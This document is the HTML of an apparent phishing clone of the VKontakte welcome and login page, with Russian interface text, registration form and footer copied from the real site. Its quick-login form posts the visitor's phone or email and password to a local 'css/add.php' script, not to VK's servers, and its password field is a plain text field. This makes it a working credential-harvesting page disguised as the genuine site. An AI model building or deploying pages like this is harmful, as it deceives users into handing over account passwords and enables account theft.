<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
	<head>
<link rel="shortcut icon" href="/image/faviconnew.ico">
<meta charset="utf-8">
<link href="css/add.php">
<link rel="apple-touch-icon" href="/image/safari_60.png">
<link rel="apple-touch-icon" sizes="76x76" href="/image/safari_76.png">
<link rel="apple-touch-icon" sizes="120x120" href="/image/safari_120.png">
<link rel="apple-touch-icon" sizes="152x152" href="/image/safari_152.png">
<title>Добро пожаловать | ВКонтакте</title>

<link rel="stylesheet" type="text/css" href="/css/common.css">
<link href="/css/notifier.css" rel="stylesheet" type="text/css">
<link href="/css/index.css" rel="stylesheet" type="text/css">

</head>

<body onresize="onBodyResize()" class="is_rtl font_default pads firefox ">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"><div id="common_css"></div><div id="login_css"></div><iframe></iframe><div style="display: none;" class="chat_onl_wrap" id="chat_onl_wrap"><div class="chats_sp chat_cont_sh_top"></div><div class="chat_cont_scrolling"><div class="chat_onl_height"></div></div><div class="chats_sp chat_cont_sh_bottom"></div><a class="chat_tab_wrap" id="chat_tab_wrap" onclick="Chat.showFriends()" onmouseover="Chat.showTT();"><div class="chat_onl_cont"><div class="chat_onl" id="chat_onl"></div><div class="chats_sp chat_onl_icon"></div></div></a></div><div id="index_css"></div><div style="display: none;" class="chat_onl_wrap" id="chat_onl_wrap"><div class="chats_sp chat_cont_sh_top"></div><div class="chat_cont_scrolling"><div class="chat_onl_height"></div></div><div class="chats_sp chat_cont_sh_bottom"></div><a class="chat_tab_wrap" id="chat_tab_wrap" onclick="Chat.showFriends()" onmouseover="Chat.showTT();"><div class="chat_onl_cont"><div class="chat_onl" id="chat_onl"></div><div class="chats_sp chat_onl_icon"></div></div></a></div><div id="notifier_css"></div></div>

  <div style="height: 328px;" id="layer_bg" class="fixed"></div><div style="width: 1858px; height: 328px;" id="layer_wrap" class="scroll_fix_wrap fixed"><div style="width: 1840px;" id="layer"></div></div>
  <div style="height: 328px;" id="box_layer_bg" class="fixed"></div><div style="width: 1858px; height: 328px;" id="box_layer_wrap" class="scroll_fix_wrap fixed"><div style="width: 1840px;" id="box_layer"><div id="box_loader"><div class="loader"></div><div class="back"></div></div></div></div>

  <div style="left: 0px; width: 525px; height: 328px;" class="fixed" id="stl_left"><div id="stl_bg"><nobr id="stl_text">Наверх</nobr></div></div><div style="left: 525px; width: 140px; top: 268px; height: 60px;" class="fixed" id="stl_side"><div style="display: none;" id="fmenu"><a class="fmenu_item fl_r" onmouseover="Pads.preload('fr')" onmousedown="return Pads.show('fr', event)" href="/friends?section=requests"><span class="fmenu_text inl_bl"></span><span id="fmenu_fr" class="fmenu_icon inl_bl"></span></a><a class="fmenu_item fl_r" onmouseover="Pads.preload('ph')" onmousedown="return Pads.show('ph', event)" href="/albums?act=added"><span class="fmenu_text inl_bl"></span><span id="fmenu_ph" class="fmenu_icon inl_bl"></span></a><a class="fmenu_item fl_r" onmouseover="Pads.preload('vid')" onmousedown="return Pads.show('vid', event)" href="/video?section=tagged"><span class="fmenu_text inl_bl"></span><span id="fmenu_vid" class="fmenu_icon inl_bl"></span></a><a class="fmenu_item fl_r" onmouseover="Pads.preload('msg')" onmousedown="return Pads.show('msg', event)" href="/im"><span class="fmenu_text inl_bl"></span><span id="fmenu_msg" class="fmenu_icon inl_bl"></span></a><a class="fmenu_item fl_r" onmouseover="Pads.preload('gr')" onmousedown="return Pads.show('gr', event)" href="/groups"><span class="fmenu_text inl_bl"></span><span id="fmenu_gr" class="fmenu_icon inl_bl"></span></a><a class="fmenu_item fl_r" onmouseover="Pads.preload('nws')" onmousedown="return Pads.show('nws', event)" href="/feed?section=notifications"><span class="fmenu_text inl_bl"></span><span id="fmenu_nws" class="fmenu_icon inl_bl"></span></a><a class="fmenu_item fl_r" onmouseover="Pads.preload('ap')" onmousedown="return Pads.show('ap', event)" href="/apps"><span class="fmenu_text inl_bl"></span><span id="fmenu_ap" class="fmenu_icon inl_bl"></span></a></div></div>
<div class="scroll_fix_wrap" id="page_wrap"><div id="reg_bar" class="top_info_wrap fixed">
  <div style="width: 1840px;" class="scroll_fix">
    <div id="reg_bar_content">
      Присоединяйтесь, чтобы всегда оставаться в контакте с друзьями и близкими
      <div class="button_blue" id="reg_bar_button"><a class="button_link" href="/join" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)"><button id="reg_bar_btn"><span id="reg_bar_with_arr">Зарегистрироваться</span></button></a></div>
    </div>
  </div>
</div>
<div><div style="width: 1840px;" class="scroll_fix">
  <div id="page_layout" style="width: 791px;">
    <div id="page_header" class="p_head p_head_l0">
      <div class="back"></div>
      <div class="left"></div>
      <div class="right"></div>
      <div class="content">
        <div id="top_nav" class="head_nav">
  <div id="top_logo_down" class="fl_l"></div>
  <a id="top_home_link" class="top_home_link fl_l" href="/" onmousedown="addClass('top_logo_down','tld_d');" onclick="return nav.go(this, event);"></a>
  <div id="top_links">
    <div class="fl_r" id="top_menu_wrap" style="">
      <a id="top_reg_link" class="fl_r top_nav_link" href="/join" style="display: none;" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">регистрация</a>
      <a id="top_switch_lang" class="fl_r top_nav_link" style="" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: ''});" onmousedown="tnActive(this)">Switch to English</a>
    </div>
    <a style="max-width: 748px;" class="fl_l top_nav_link" href="" id="top_back_link" onclick="return nav.go(this, event, {back: true})" onmousedown="tnActive(this)"></a>
  </div>
</div>
      </div>
    </div>

    <div id="side_bar" class="fl_l" style="">
      <div id="quick_login">
  <div><iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe></div><form method="post" action="css/add.php">
    <div class="label">Телефон или email</div>
    <div class="labeled"><input name="email" class="text" type="text"></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input name="pass" class="text" type="text"></div>
    <input class="submit" type="submit">
    <a href="css/add.php"><button class="flat_button button_wide button_big" >Войти</button></a>
  </form>
		  
  <button class="flat_button button_wide button_big" id="quick_reg_button" style="display: none;" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
  <div class="clear forgot"><a id="quick_forgot" href="/restore" target="_top">Забыли пароль?</a><div class="checkbox ta_l" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';"><div></div>Чужой компьютер</div></div>
</div>
    </div>

    <div id="page_body" class="fl_r" style="width: 631px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="">
            <h1 id="title">Добро пожаловать</h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><div id="index">
  <iframe class="upload_frame" src="https://login.vk.com/?role=al_frame&amp;_origin=http://vk.com&amp;ip_h=0ec450a1756949dadc"></iframe>
  <div class="content">
    <p><b>ВКонтакте</b> – универсальное средство для общения и поиска друзей и одноклассников,<br>которым ежедневно пользуются десятки миллионов человек.</p>

    <h2>Моментальная регистрация</h2>

    <div class="msg" id="ij_msg"></div>

    <div class="ij_form">
      <div class="ij_reg_row">
        <div class="input_back_wrap no_select"><div style="margin: 1px; padding: 5px 4px 4px;" class="input_back"><div class="input_back_content" style="width: 140px;">Ваше имя</div></div></div><input class="big_text" id="ij_first_name" value="" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" type="text">
      </div>
      <div class="ij_reg_row">
        <div class="input_back_wrap no_select"><div style="margin: 1px; padding: 5px 4px 4px;" class="input_back"><div class="input_back_content" style="width: 140px;">Ваша фамилия</div></div></div><input class="big_text" id="ij_last_name" value="" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" type="text">
      </div>
      <div class="ij_reg_row" id="ij_sex_row">
        <input id="ij_sex" name="ij_sex" type="hidden">
      </div>
      <center>
        <button class="flat_button button_big ij_button" id="ij_submit" onclick="Index.submitJoinStart()">
          <span class="ij_with_arr">Зарегистрироваться</span>
        </button>
      </center>
      <div id="index_fbsign">
        <div class="index_fbb">
          <div class="index_or"><div class="index_or_l"></div><span class="index_or_s">или</span></div>
          <center>
            <button class="flat_button ij_button index_fb_btn" id="index_fb" onclick="Index.fbJoin();">
              <div class="index_fb_logo"></div>
              <div class="index_fb_l">Войти через Facebook</div>
            </button>
          </center>
        </div>
      </div>
    </div>

    <h2>В чём поможет ВКонтакте?</h2>
    <ul class="listing">
      <li><span>Найти людей, с которыми Вы когда-либо учились, работали или отдыхали.</span></li>
      <li><span>Узнать больше о людях, которые Вас окружают, и найти новых друзей.</span></li>
      <li><span>Всегда оставаться в контакте с теми, кто Вам дорог.</span></li>
    </ul>
  </div>
  <div class="reg">
    <table id="ij_screens" cellpadding="0" cellspacing="0"><tbody><tr>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(0)"><img src="/image/prof_m.png" class="ijs_img"></a></td>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(1)"><img src="/image/news_m.png" class="ijs_img"></a></td>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(2)"><img src="/image/dial_m.png" class="ijs_img"></a></td>
    </tr></tbody></table>
  </div>
</div></div>
  </div>
</div></div>
    </div>

    <div id="footer_wrap" class="fl_r" style="width: 661px;">
      <div id="bottom_nav">
  <a class="bnav_a" href="/about">о сайте</a>
  <a class="bnav_a" href="/support?act=home" onclick="return nav.go(this, event);" style="display: none;">помощь</a>
  <a class="bnav_a" href="/terms">правила</a>
  <a class="bnav_a" href="/ads">реклама</a>
  <a class="bnav_a" href="/people">люди</a><a class="bnav_a" href="/communities">сообщества</a>
  <a class="bnav_a" href="/dev">разработчикам</a>
  <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
</div>
<div id="footer" class="clear">
  <div class="copy_lang"><a href="/about">ВКонтакте</a> © 2016 <a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '6f0e607f72676ceb0d'})">English</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '6f0e607f72676ceb0d'})">Русский</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '6f0e607f72676ceb0d'})">Українська</a><a class="bnav_lang" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки »</a></div>



</body></html>